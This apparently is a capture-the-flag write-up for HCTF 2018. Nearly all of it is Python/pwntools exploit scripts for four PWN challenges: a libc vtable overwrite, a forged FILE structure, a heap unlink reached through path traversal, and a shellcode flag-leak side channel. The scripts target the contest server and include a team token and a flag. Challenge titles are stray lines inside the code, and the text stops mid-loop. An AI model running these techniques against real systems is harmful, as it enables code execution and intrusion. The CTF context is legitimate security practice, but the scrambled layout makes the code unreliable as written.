HCTF 2018
HCTF 2018
PWN
the end
babyprintf_ver2
easyexp
christmas
Reverse
LuckyStar
Seven
PolishDuck
Web
kzone
admin
bottle | open | working:
hide and seek
Game | solved | working:
Crypto
xor game
rsa?xor
BlockChain
Re:Ethereum from zero
ez2win
MISC
freq game
eazy dump
Diï¬ƒcult programming language
Guess My Key
https://hctf.io/#/ 119 20:00 - 1111 20:00
PWN
the end
from pwn import *
#context.aslr = False
context.log_level = 'debug'
def pwn(p):
    p.recvuntil('here is a gift ')
    libc_base = int(p.recvuntil(',', drop=True), 16) - 0x0CC230
babyprintf_ver2
    stdout_vtable = libc_base + 0x3c56f8
    fake_io_jump = 0x3c3fb0 + libc_base
    remote_addr = libc_base + 0x3c4008
    one_gadget = libc_base + 0x4526a
    one_gadget = libc_base + 0xF02B0
    log.success('libc: {}'.format(hex(libc_base)))
    log.success('stdout_vtable: {}'.format(hex(stdout_vtable)))
    log.success('fake_io_jump: {}'.format(hex(fake_io_jump)))
    log.success('remote_addr: {}'.format(hex(remote_addr)))
    log.success('one_gadget: {}'.format(hex(one_gadget)))
    #0x3c5c58
    payload = p64(stdout_vtable)
    payload += p64(fake_io_jump)[0]
    payload += p64(stdout_vtable + 1)
    payload += p64(fake_io_jump)[1]
    payload += p64(remote_addr)
    payload += p64(one_gadget)[0]
    payload += p64(remote_addr + 1)
    payload += p64(one_gadget)[1]
    payload += p64(remote_addr + 2)
    payload += p64(one_gadget)[2]
    #gdb.attach(p)
    p.send(payload)
    p.interactive()
if __name__ == '__main__':
    p = remote('150.109.44.250', 20002)
    p.recvuntil('Input your token:')
    p.sendline('RVZhvB2OtdydtHAaHxdEeRcFzZlKIC9U')
    #p = process('./the_end')
    #p.interactive()
    pwn(p)
from pwn import *
context.log_level = 'debug'
context.aslr = False
def pwn(p):
    p.recvuntil('So I change the buffer location to ')
    program_base = int(p.recvuntil('\n', drop=True), 16) - 0x202010
    log.success('program_base: {}'.format(hex(program_base)))
    p.sendline('%a')
    p.recvuntil('0x0.0')
    libc_base = int(p.recvuntil('p', drop=True), 16) - 0x50e8
    log.success('libc_base: {}'.format(hex(libc_base)))
    p.sendline('%100000cb')
    p.recvuntil('b')
    malloc_hook = 0x3ebc30
    remote = libc_base + malloc_hook - 0x10
    payload = 'a'*0xf + '\x00'
    payload += p64(program_base + 0x202028)
    payload += p64(0x00000000fbad2887) + p64(0)
    payload += p64(0) + p64(0)
    payload += p64(remote) + p64(remote)
    payload += p64(remote + 0x20) + p64(0)
    payload += p64(0) + p64(0)
    payload += p64(0) + p64(0)
    payload += p64(0) + p64(0)
    payload += p64(1) + p64(0xffffffffffffffff)
    payload += p64(0) + p64(libc_base + 0x3ed8c0) # lock
    payload += p64(0xffffffffffffffff) + p64(0)
    payload += p64(libc_base + 0x3eb8c0) + p64(0) # _IO_wide_data_1
    payload += p64(0) + p64(0)
    payload += p64(0x00000000ffffffff) + p64(0)
    payload += p64(0) + p64(libc_base + 0x3e82a0) # vtable
    #gdb.attach(p)
    log.info('remote: {}'.format(hex(remote)))
    log.info('fake: {}'.format(hex(program_base + 0x202028)))
    p.sendline(payload)
    one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
    payload = 'a' + p64(one_gadget[1] + libc_base)
    p.sendline(payload)
    payload = 'a'*0xf + '\x00'
    payload += p64(program_base + 0x202028)
    payload += p64(0x00000000fbad2887) + p64(0)
    payload += p64(0) + p64(0)
    payload += p64(0) + p64(0)
    payload += p64(0) + p64(0)
    payload += p64(0) + p64(0)
    payload += p64(0) + p64(0)
    payload += p64(0) + p64(0)
    payload += p64(1) + p64(0xffffffffffffffff)
    payload += p64(0) + p64(libc_base + 0x3ed8c0) # lock
    payload += p64(0xffffffffffffffff) + p64(0)
    payload += p64(libc_base + 0x3eb8c0) + p64(0) # _IO_wide_data_1
    payload += p64(0) + p64(0)
    payload += p64(0x00000000ffffffff) + p64(0)
easyexp
    payload += p64(0) + p64(libc_base + 0x3e82a0) # vtable
    p.sendline(payload)
    p.sendline('%100000c')
    #p.recvuntil('a'*0xf)
    p.interactive()
if __name__ == '__main__':
    #p = process('./babyprintf_ver2')
    p = remote('150.109.44.250', 20005)
    p.recvuntil('Input your token:')
    p.sendline('RVZhvB2OtdydtHAaHxdEeRcFzZlKIC9U')
    pwn(p)
from pwn import *
context.aslr = False
context.log_level = 'debug'
def mkdir(p, filename):
    p.recvuntil('$')
    p.clean()
    p.sendline('mkdir ' + filename)
def mkfile(p, filename, data):
    p.recvuntil('$')
    p.clean()
    p.sendline('mkfile ' + filename)
    p.recvuntil('write something:')
    p.send(data)
def cat(p, filename):
    p.recvuntil('$')
    p.clean()
    p.sendline('cat ' + filename)
def trig_cve(p, buf):
    mkdir(p, '../../{}'.format(buf))
def pwn(p):
    libc = ELF('./libc-2.23.so')
    p.recvuntil('input your home\'s name: ')
    p.sendline('(unreachable)')
    mkfile(p, 'ccc', '/bin/sh\n')
christmas
    payload = '/'*0x87
    mkfile(p, '(unreachable)/tmp', payload + '\n')
    payload = 'z'*0x87
    mkfile(p, 'aaa', payload + '\n')
    payload = 'b\x90'
    trig_cve(p, payload)
    trig_cve(p, '')
    payload = p64(0) + p64(0x81)
    payload += p64(0x603180 - 0x18 + 0x60) + p64(0x603180 - 0x10 + 0x60)
    payload = payload.ljust(0x80, 'c')
    payload += p64(0x80)[:7]
    mkfile(p, '(unreachable)/tmp', payload)
    # unlink
    mkfile(p, '123', '\n')
    payload = '\x00'*0x18 + p64(0x603038) # puts
    payload += p32(0x87)[:3]
    mkfile(p, '(unreachable)/tmp', payload + '\n')
    cat(p, '(unreachable)/tmp')
    libc_base = u64(p.recv(6).ljust(8, '\x00')) - 0x6f690
    log.success('libc_base: {}'.format(hex(libc_base)))
    payload = p64(libc_base + 0x45390) # system
    mkfile(p, '(unreachable)/tmp', payload + '\n')
    cat(p, 'ccc')
    #gdb.attach(proc.pidof(p)[0])
    p.interactive()
if __name__ == '__main__':
    local = 0
    if local:
        p = process('./easyexp', env = {'LD_PRELOAD': './libc-2.23.so'})
    else:
        p = remote('150.109.44.250', 20004)
        p.recvuntil('token:')
        p.sendline('RVZhvB2OtdydtHAaHxdEeRcFzZlKIC9U')
    pwn(p)
#coding=utf8
from pwn import *
context.arch = 'amd64'
def make_guess_shellcode(n, ch):
    # flag > ch 
    # 
    shellcode = '''
    mov rdx, 0x10700ee0
    xor rdx, 0x10101010
    mov rbx, [rdx] # 0x601ef0
    mov rbx, [rbx+0x8]
    mov rbx, [rbx+0x18]
    mov rbx, [rbx+0x18]
    mov rbx, [rbx+0x18]
    mov rbx, [rbx+0x18]
    mov rbx, [rbx+0x18]
    mov rbx, [rbx+0x18] # rbx = linkmap flag.so
    mov rdx, 0x10703020
    xor rdx, 0x10101010
    mov rcx, [rdx] # 0x602030
    mov rdx, 0x101d5030
    xor rdx, 0x10101010
    add rcx, rdx # 0xd4020 __libc_dlsym
    mov rdi, rbx
    /* push 'flag_yes_1337\x00' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x373333315f
    xor [rsp], rax
    mov rax, 0x7365795f67616c66
    push rax
    mov rsi, rsp
    call rcx
    call rax
    '''
    payload = asm(shellcode)
    payload += asm('xor rbx, rbx')
    if n != 0:
        payload += asm('mov bl, {}'.format(n))
    payload += asm('''
    xor rcx, rcx
    add rax, rbx
    mov cl, byte ptr [rax]
    ''')
    payload += asm('''
    fuck:
    cmp cl, {}
    jg fuck
    '''.format(ch))
    return payload
def shellcoe_encode(shellcode):
    payload = asm('''
    push rax
    xor al, 0x33
    ''')
    p = remote('192.168.178.1', 24356)
    p.send(shellcode)
    payload += p.recvall()
    p.close()
    return payload
def guess(n, ch):
    # flag > ch ret true
    #p = process('./christmas-bak')
    p = remote('150.109.44.250', 20003)
    p.recvuntil('Input your token:')
    p.sendline('RVZhvB2OtdydtHAaHxdEeRcFzZlKIC9U')
    log.info('start')
    #p = process('./christmas')
    try:
        p.recvuntil('can you tell me how to find it??\n')
        p.clean()
        payload = make_guess_shellcode(n, ch)
        payload = payload.ljust(0x100 - 48, 'a')
        payload = shellcoe_encode(payload)
        #log.info(repr(payload))
        #gdb.attach(p)
        p.sendline(payload)
        #p.interactive()
        #exit()
        p.recvuntil('\n', timeout=1)
    except EOFError:
        p.close()
        return False
    p.close()
    return True
def pwn():
    # HCTF{dyn_15_4w350m3}
    flag = 'HCTF{'
    while True:
        l = 0
        r = 255
        idx = len(flag)
        while True:
            m = (l + r) / 2
            if m == l: